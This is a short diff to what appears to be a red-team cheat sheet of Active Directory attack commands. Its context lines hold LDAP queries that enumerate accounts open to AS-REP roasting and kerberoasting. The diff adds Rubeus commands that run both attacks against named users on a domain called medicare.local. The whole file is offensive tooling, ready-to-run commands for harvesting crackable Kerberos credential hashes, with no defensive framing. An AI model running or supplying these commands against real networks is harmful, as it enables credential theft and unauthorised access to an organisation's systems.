@@ -53,3 +53,7 @@ sa-ldapsearch (&(objectClass=user)(!(objectclass=computer)))
 sa-ldapsearch (&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
 ## list kerberoasting
 sa-ldapsearch (&(objectClass=user)(servicePrincipalName=*))
+## rubeus asrep
+rubeus asreproast /user:allegra.dosi /domain:medicare.local /dc:medicare.local
+## rubeus kerberoasting
+rubeus kerberoast /user:http_svc /domain:medicare.local /dc:medicare.local
